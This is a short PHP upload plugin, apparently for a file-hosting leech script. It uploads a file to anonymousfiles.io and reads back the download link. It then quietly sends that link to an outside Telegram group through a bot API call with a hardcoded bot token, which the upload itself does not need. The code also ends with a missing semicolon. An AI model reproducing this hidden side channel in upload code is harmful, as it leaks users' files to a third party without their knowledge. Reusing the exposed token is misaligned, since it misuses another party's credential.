<?php

  $_GET['proxy'] = isset($_GET['proxy']) ? $_GET['proxy'] : '';
  $not_done = true;
  $continue_up = true;

  $tgtoken = "853422522:AAGm1HLEfd8HY9ovg5sojnldNtn8uJJbvg4";	
	
  $tgchatid = "@tryinggroup";

  $uploc = 'https://api.anonymousfiles.io/';
	$url = parse_url($uploc);
	echo "<script type='text/javascript'>document.getElementById('info').style.display='none';</script>\n";
	$upfiles = upfile($url['host'], $url['path'], $lfile, $lname, 'file','', $_GET['proxy'], 0, $url['scheme']);
	echo "<script type='text/javascript'>document.getElementById('progressblock').style.display='none';</script>\n";
	
  $anonn = strpbrk($upfiles,'{');
  $anonnn = json_decode($anonn,true);
  $anonnnn = $anonnn['url'];
  $akgh = "https://api.telegram.org/bot".$tgtoken."/sendmessage?chat_id=".$tgchatid."&text=".$anonnnn;
  $akju = cURL($akgh);
  $download_link = $anonnnn
        
        
        
?>
